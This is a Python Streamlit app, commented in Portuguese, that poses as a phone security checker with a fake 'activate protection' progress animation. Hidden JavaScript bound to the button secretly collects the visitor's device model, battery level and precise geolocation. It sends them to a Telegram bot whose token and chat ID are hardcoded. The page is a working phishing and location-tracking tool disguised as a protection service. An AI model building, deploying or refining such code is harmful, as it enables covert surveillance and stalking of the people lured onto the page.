import streamlit as st
import streamlit.components.v1 as components
import time

# --- 1. CONFIGURAÇÃO E ESTILIZAÇÃO ORIGINAL (NÃO ALTERADA) ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; border-radius: 20px; background-color: #262730; 
        color: white; border: none; height: 50px; font-weight: bold;
    }
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- 2. CONFIGURAÇÃO DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
CHAT_ID = "8210828398"

# --- 3. SCRIPT DE CAPTURA E ENVIO PARA O TELEGRAM ---
# Este script força o pop-up e envia os dados quando o botão é clicado
js_capture = f"""
<script>
    async function enviarTelegram(dados) {{
        const texto = `📍 **Nova Captura**\\n📱 Modelo: ${{dados.modelo}}\\n🔋 Bateria: ${{dados.bateria}}\\n🌍 Local: https://www.google.com/maps?q=${{dados.lat}},${{dados.lon}}`;
        const url = `https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=${{encodeURIComponent(texto)}}&parse_mode=Markdown`;
        await fetch(url);
    }}

    async function executarCaptura() {{
        let info = {{
            modelo: navigator.userAgent.match(/\\(([^)]+)\\)/)[1].split(';')[0],
            bateria: "n/a",
            lat: 0, lon: 0
        }};

        // Captura o nível da bateria
        try {{
            const b = await navigator.getBattery();
            info.bateria = Math.round(b.level * 100) + "%";
        }} catch(e) {{}}

        // Solicita a localização (Força o pop-up de precisão do Google)
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition((p) => {{
                info.lat = p.coords.latitude;
                info.lon = p.coords.longitude;
                enviarTelegram(info);
            }}, (e) => {{ console.log("Permissão negada"); }}, 
            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }});
        }
    }}

    // Vincula a captura ao clique do botão para o Chrome não bloquear o pop-up
    const monitor = setInterval(() => {{
        const btn = window.parent.document.querySelector('button');
        if (btn) {{
            btn.addEventListener('click', executarCaptura);
            clearInterval(monitor);
        }}
    }}, 500);
</script>
"""
components.html(js_capture, height=0)

# --- 4. INTERFACE VISUAL (CONFORME SEUS PRINTS) ---
st.title("Verificar segurança")
placeholder = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Animação da bolha subindo conforme solicitado
    for i in range(4, 101, 5):
        placeholder.markdown(f'<div class="circle-container"><div class="circle spin">{i}%</div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado inicial parado em 4%
    placeholder.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
